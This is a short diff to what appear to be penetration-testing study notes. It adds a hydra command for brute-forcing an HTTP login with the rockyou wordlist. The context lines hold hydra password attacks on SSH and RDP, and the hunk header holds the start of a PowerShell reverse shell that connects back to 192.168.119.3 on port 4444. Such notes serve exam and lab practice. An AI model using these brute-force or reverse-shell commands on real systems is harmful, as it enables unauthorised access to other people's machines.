@@ -263,3 +263,4 @@ $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444)
 - To unzip wordlist: ```sudo gzip -d rockyou.txt.gz```
 - Using wordlist with hydra for specific user: ```hydra -l <username> -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<target IP>```
 - Using hydra with known password against list of usernames: ```hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://<target IP>```
+- Using hydra with http-get: ```hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://192.168.218.201``` <15.1.2>
